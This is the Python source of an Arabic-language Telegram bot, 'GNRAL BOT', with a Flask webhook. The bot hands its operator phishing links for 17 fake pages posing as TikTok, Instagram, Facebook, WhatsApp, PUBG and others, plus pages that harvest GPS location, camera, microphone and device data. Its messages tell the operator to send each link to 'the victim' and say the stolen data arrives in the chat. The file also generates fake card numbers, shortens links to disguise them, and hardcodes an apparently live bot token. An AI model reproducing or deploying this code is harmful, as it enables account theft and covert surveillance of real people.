```python
import os, sys, subprocess, time, threading, random, string, logging, io
import requests

# ========== تثبيت تلقائي (مع تجاهل أخطاء المكتبات غير الضرورية) ==========
def safe_install(package, import_name=None):
    name = import_name or package
    try:
        __import__(name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
        except:
            pass

safe_install("flask", "flask")
safe_install("requests", "requests")
safe_install("pyTelegramBotAPI", "telebot")
safe_install("gTTS", "gtts")
safe_install("qrcode[pil]", "qrcode")
safe_install("Pillow", "PIL")
safe_install("pyshorteners", "pyshorteners")
safe_install("deep-translator", "deep_translator")

from flask import Flask, request
from telebot import TeleBot, types
from io import BytesIO

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات
APP_URL = "https://gamee-h4uf.onrender.com"           # رابط تطبيق البوت

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

user_states = {}
bot_rating = 0

# ========== الصفحات الاحتيالية (17 زر) ==========
PHISH_PAGES = [
    ("🎵 تيك توك", "tiktok.html"),       ("📷 انستقرام", "instagram.html"),
    ("👻 سناب شات", "snapchat.html"),     ("📘 فيسبوك", "facebook.html"),
    ("💬 واتساب", "whatsapp.html"),       ("✈️ تيليجرام", "telegram.html"),
    ("🐦 تويتر", "twitter.html"),         ("▶️ يوتيوب", "youtube.html"),
    ("🎮 ديسكورد", "discord.html"),       ("🤖 ريدت", "reddit.html"),
    ("🎮 ببجي UC", "pubg_cuc.html"),      ("🏆 مسابقة الحلم", "dream.html"),
    ("📍 سحب الموقع", "gps.html"),        ("📸 فحص الكاميرا", "camera.html"),
    ("🎙️ فحص الميكروفون", "mic.html"),    ("🎥 فحص الفيديو", "video.html"),
    ("📱 فحص مواصفات الجهاز", "device.html")
]

# ========== دوال مساعدة للأدوات ==========
def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

def generate_fake_visa():
    prefixes = ["4", "5", "37", "34"]
    prefix = random.choice(prefixes)
    length = 16 if prefix in ["4", "5"] else 15
    while len(prefix) < length: prefix += str(random.randint(0, 9))
    exp = f"{random.randint(1,12):02d}/{random.randint(2025,2030)}"
    cvv = random.randint(100,999)
    return f"💳 رقم: {prefix}\n📅 تاريخ: {exp}\n🔒 CVV: {cvv}"

def shorten_url(url):
    try:
        from pyshorteners import Shortener
        s = Shortener()
        return s.tinyurl.short(url)
    except:
        pass
    try:
        r = requests.get(f"https://tinyurl.com/api-create.php?url={requests.utils.quote(url)}", timeout=5)
        if r.status_code == 200: return r.text.strip()
    except: pass
    return url

def text_to_speech(text, lang='ar'):
    from gtts import gTTS
    tts = gTTS(text, lang=lang)
    buf = BytesIO()
    tts.write_to_fp(buf)
    buf.seek(0)
    return buf

def translate_text(text, target='ar'):
    try:
        from deep_translator import GoogleTranslator
        translator = GoogleTranslator(source='auto', target=target)
        return translator.translate(text)
    except:
        return "تعذرت الترجمة"

def decorate_text(text):
    replacements = {
        'ا':'أ', 'ب':'بـ', 'ت':'تـ', 'ث':'ثـ', 'ج':'جـ', 'ح':'حـ', 'خ':'خـ',
        'د':'د', 'ذ':'ذ', 'ر':'ر', 'ز':'ز', 'س':'سـ', 'ش':'شـ', 'ص':'صـ',
        'ض':'ضـ', 'ط':'طـ', 'ظ':'ظـ', 'ع':'عـ', 'غ':'غـ', 'ف':'فـ', 'ق':'قـ',
        'ك':'كـ', 'ل':'لـ', 'م':'مـ', 'ن':'نـ', 'ه':'هـ', 'و':'و', 'ي':'يـ'
    }
    return ''.join(replacements.get(c, c) for c in text)

def create_temp_email():
    try:
        s = requests.Session()
        headers = {'User-Agent': 'Mozilla/5.0'}
        r = s.get('https://api.mail.tm/domains', headers=headers)
        domain = r.json()['hydra:member'][0]['domain']
        email = ''.join(random.choice(string.ascii_lowercase) for _ in range(10)) + "@" + domain
        pwd = generate_password(12)
        s.post('https://api.mail.tm/accounts', json={'address': email, 'password': pwd}, headers=headers)
        return f"📧 البريد: {email}\n🔑 كلمة المرور: {pwd}"
    except:
        return "فشل إنشاء بريد مؤقت"

def generate_qr_code(data):
    import qrcode
    qr = qrcode.QRCode(version=1, box_size=10, border=4)
    qr.add_data(data)
    qr.make(fit=True)
    img = qr.make_image(fill_color="black", back_color="white")
    buf = BytesIO()
    img.save(buf, 'PNG')
    buf.seek(0)
    return buf

def read_qr_from_image(file_bytes):
    try:
        from PIL import Image
        from pyzbar.pyzbar import decode
        img = Image.open(BytesIO(file_bytes))
        decoded = decode(img)
        if decoded: return decoded[0].data.decode('utf-8')
    except: return None
    return None

# ========== Webhook ==========
@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        except Exception as e:
            logging.error(f"Webhook error: {e}")
            return ''
    return '!', 403

@app.route("/health")
def health(): return "OK", 200

# ========== لوحة البداية ==========
@bot.message_handler(commands=['start'])
def start(msg):
    chat_id = msg.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)

    # 1. صفوف الصفحات (8 أزواج + زر عريض)
    for i in range(0, len(PHISH_PAGES) - 1, 2):
        left = PHISH_PAGES[i]; right = PHISH_PAGES[i+1]
        markup.row(types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
                   types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}"))
    last = PHISH_PAGES[-1]
    markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))

    # 2. الأدوات
    markup.row(types.InlineKeyboardButton("🔊 نص إلى صوت", callback_data="tts"),
               types.InlineKeyboardButton("✨ زخرفة نصوص", callback_data="decor"))
    markup.row(types.InlineKeyboardButton("🔗 اختصار رابط", callback_data="shorten"),
               types.InlineKeyboardButton("🔐 توليد كلمة سر", callback_data="genpass"))
    markup.row(types.InlineKeyboardButton("🌐 ترجمة", callback_data="translate"),
               types.InlineKeyboardButton("📧 بريد وهمي", callback_data="tempmail"))
    markup.row(types.InlineKeyboardButton("📸 إنشاء باركود", callback_data="createqr"),
               types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"))
    markup.row(types.InlineKeyboardButton("💳 فيزا وهمية", callback_data="visa"),
               types.InlineKeyboardButton("🆔 معرفي", callback_data="myid"))
    markup.row(types.InlineKeyboardButton("📜 نصائح", callback_data="tips"),
               types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"))
    markup.row(types.InlineKeyboardButton("📄 شروط", callback_data="terms"),
               types.InlineKeyboardButton("📖 شرح البوت", callback_data="help"))
    markup.row(types.InlineKeyboardButton("⭐ تقييم", callback_data="rate"),
               types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))

    wel = "🔱 <b>GNRAL BOT</b>\n\nاختر الخدمة التي تريدها:"
    bot.send_message(chat_id, wel, parse_mode="HTML", reply_markup=markup)

# ========== معالج الأزرار ==========
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id; data = call.data; msg_id = call.message.message_id

    # الرجوع للقائمة الرئيسية
    if data == "back":
        start(call.message)
        bot.answer_callback_query(call.id)
        return

    # الصفحات الاحتيالية
    if data.startswith("ph|"):
        page = data.split("|")[1]
        link = f"{BASE_URL}/{page}?chat={chat_id}"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسله للضحية. البيانات ستصل إليك هنا.",
                              chat_id, msg_id, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    # الأدوات
    if data == "tts":
        user_states[chat_id] = "tts"; bot.send_message(chat_id, "🎙️ أرسل النص لتحويله إلى صوت:")
    elif data == "decor":
        user_states[chat_id] = "decor"; bot.send_message(chat_id, "✨ أرسل النص لزخرفته:")
    elif data == "shorten":
        user_states[chat_id] = "shorten"; bot.send_message(chat_id, "🔗 أرسل الرابط لاختصاره:")
    elif data == "genpass":
        bot.send_message(chat_id, f"🔐 كلمة المرور:\n<code>{generate_password()}</code>", parse_mode="HTML")
    elif data == "translate":
        user_states[chat_id] = "translate"; bot.send_message(chat_id, "🌐 أرسل النص لترجمته:")
    elif data == "tempmail":
        bot.send_message(chat_id, create_temp_email())
    elif data == "createqr":
        user_states[chat_id] = "createqr"; bot.send_message(chat_id, "📸 أرسل النص لإنشاء باركود:")
    elif data == "readqr":
        user_states[chat_id] = "readqr"; bot.send_message(chat_id, "📷 أرسل صورة الباركود:")
    elif data == "visa":
        bot.send_message(chat_id, generate_fake_visa())
    elif data == "myid":
        bot.send_message(chat_id, f"🆔 معرف حسابك: {call.from_user.id}")
    elif data == "tips":
        bot.send_message(chat_id, "📜 <b>نصائح</b>\n\n1. لا تشارك بياناتك.\n2. استخدم كلمات مرور قوية.\n3. فعّل التحقق بخطوتين.", parse_mode="HTML")
    elif data == "hack":
        bot.send_message(chat_id, "💻 <b>كيف تصبح هاكر</b>\n\n1. Linux\n2. Python\n3. شبكات\n4. ثغرات الويب\n5. منصات تدريب (HTB, THM)", parse_mode="HTML")
    elif data == "terms":
        bot.send_message(chat_id, "📜 <b>شروط الاستخدام</b>\n\n✅ للاستخدام المشروع فقط.\n⚠️ المستخدم يتحمل المسؤولية.", parse_mode="HTML")
    elif data == "help":
        bot.send_message(chat_id, "📖 <b>شرح البوت</b>\n\nأزرار الصفحات تعطيك روابط تصيد. باقي الأزرار تعمل داخل تلغرام مباشرة.", parse_mode="HTML")
    elif data == "rate":
        global bot_rating; bot_rating += 1
        bot.send_message(chat_id, f"⭐ شكراً! عدد التقييمات: {bot_rating}")

    bot.answer_callback_query(call.id)

# ========== معالج النصوص التفاعلية ==========
@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "tts")
def handle_tts(m):
    user_states.pop(m.chat.id, None)
    try:
        bot.send_voice(m.chat.id, text_to_speech(m.text))
    except:
        bot.send_message(m.chat.id, "تعذر تحويل النص إلى صوت")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "decor")
def handle_decor(m):
    user_states.pop(m.chat.id, None)
    bot.send_message(m.chat.id, decorate_text(m.text))

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "shorten")
def handle_shorten(m):
    user_states.pop(m.chat.id, None)
    bot.send_message(m.chat.id, f"🔗 المختصر: {shorten_url(m.text)}")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "translate")
def handle_translate(m):
    user_states.pop(m.chat.id, None)
    bot.send_message(m.chat.id, f"🌐 النص المترجم:\n{translate_text(m.text)}")

@bot.message_handler(content_types=['photo'])
def handle_photo(m):
    if user_states.get(m.chat.id) == "readqr":
        user_states.pop(m.chat.id, None)
        file_info = bot.get_file(m.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        result = read_qr_from_image(downloaded)
        bot.send_message(m.chat.id, result if result else "لم يتم التعرف على باركود")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "createqr")
def handle_createqr(m):
    user_states.pop(m.chat.id, None)
    try:
        bot.send_photo(m.chat.id, generate_qr_code(m.text))
    except:
        bot.send_message(m.chat.id, "فشل إنشاء الباركود")

# ========== Keep-Alive ==========
def keep_alive():
    while True:
        time.sleep(120)
        try: requests.get(f"{APP_URL}/health", timeout=5)
        except: pass

threading.Thread(target=keep_alive, daemon=True).start()

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
```